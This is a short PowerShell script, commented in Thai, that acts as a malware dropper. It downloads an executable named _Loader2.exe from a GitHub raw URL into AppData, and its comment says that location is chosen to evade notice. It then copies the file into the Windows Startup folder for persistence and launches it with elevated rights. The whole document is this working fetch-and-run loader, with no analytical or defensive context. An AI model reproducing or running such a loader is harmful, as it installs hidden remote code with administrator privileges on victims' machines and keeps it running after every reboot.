# 1. ตั้งค่าตำแหน่งไฟล์
$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe"
$destPath = "$env:APPDATA\_Loader.exe"  # เก็บไว้ใน AppData เพื่อหลบสายตา
$startupLnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\_Loader2.exe"

Write-Host "Checking System..." -ForegroundColor Cyan

# 2. ตรวจสอบและดาวน์โหลดไฟล์มาไว้ในเครื่อง (ถ้ายังไม่มี)
if (!(Test-Path $destPath)) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $destPath
    } catch {
        Write-Host "Connection Error!" -ForegroundColor Red
        exit
    }
}

# 3. สร้างระบบ "รันอัตโนมัติ" (Copy ไปไว้ในโฟลเดอร์ Startup)
if (!(Test-Path $startupLnk)) {
    Copy-Item -Path $destPath -Destination $startupLnk -Force
    Write-Host "Persistence Enabled." -ForegroundColor Green
}

# 4. รันโปรแกรมขึ้นมาทำงาน
Start-Process -FilePath $destPath -Verb RunAs
